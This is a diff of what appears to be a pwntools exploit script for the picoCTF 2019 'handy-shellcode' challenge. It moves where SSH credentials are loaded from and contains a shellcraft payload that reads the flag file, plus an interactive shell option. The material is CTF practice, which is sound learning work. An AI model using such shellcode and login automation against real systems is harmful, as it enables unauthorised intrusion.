@@ -13,7 +13,7 @@ if(LOCAL):
 else:
     hostname = "2019shell1.picoctf.com"
     dir = '/problems/handy-shellcode_6_f0b84e12a8162d64291fd16755d233eb'
-    with open("../../creds.json") as f:
+    with open("/.2019creds.json") as f:
         creds = json.load(f)
         print(creds["user"],creds["pass"])
     s = ssh(host=hostname,user=creds["user"],password=creds["pass"])
@@ -38,7 +38,7 @@ elif(SHELL):
     p.interactive()
     exit()
 
-#using shellcraft library from pwntools to just cat the flag 
+#using shellcraft library from pwntools to just cat the flag
 elif(CAT):
     payload = asm(shellcraft.i386.linux.cat('flag.txt'))
     print p.recvline().decode()
